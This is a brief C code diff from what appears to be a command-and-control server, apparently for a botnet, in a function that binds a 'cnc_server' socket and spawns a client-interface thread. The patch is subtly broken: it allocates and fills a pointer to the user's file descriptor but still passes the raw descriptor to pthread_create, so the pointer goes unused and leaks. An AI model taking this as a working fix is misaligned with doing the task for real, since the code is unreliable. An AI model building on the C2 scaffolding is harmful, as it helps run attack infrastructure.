@@ -27,6 +27,8 @@ void c_server(int fd_user) {
     bind(s_fd, (struct sockaddr *)&cnc_server, sizeof(cnc_server));     
     listen(s_fd, 3);
     
+    int *fd_user_ptr = malloc(sizeof(int));
+    *fd_user_ptr = fd_user;
     pthread_t thread_cli;
     pthread_create(&thread_cli, NULL, interface, fd_user);
     l = sizeof(cnc_server);
